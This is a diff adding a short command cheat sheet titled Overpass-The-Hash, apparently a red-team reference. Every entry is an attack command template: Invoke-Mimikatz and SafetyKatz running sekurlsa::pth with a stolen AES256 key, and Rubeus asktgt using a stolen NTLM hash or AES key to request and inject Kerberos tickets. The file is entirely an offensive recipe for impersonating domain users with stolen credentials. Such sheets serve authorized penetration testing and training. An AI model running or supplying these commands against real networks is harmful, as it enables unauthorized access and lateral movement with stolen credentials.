@@ -1,0 +1,13 @@
+% Overpass-The-Hash
+
+# Invoke-Mimikatz (logon type 9)
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aeskey> /run:<program-to-run>"'
+
+# Safetykatz (logon type 9)
+Safetykatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aeskey> /run:<program-to-run>" "exit" 
+
+# Rubeus (without elevation - deletes alomst all tickets)
+Rubeus.exe asktgt /user:<user> /rc4:<ntlm-hash> /ptt
+
+# Rubeus (with elevation - logon type 9)
+Rubeus.exe asktgt /user:<user> /aes256:<aeskey> /opsec /createnetonly:<program-to-run> /show /ptt
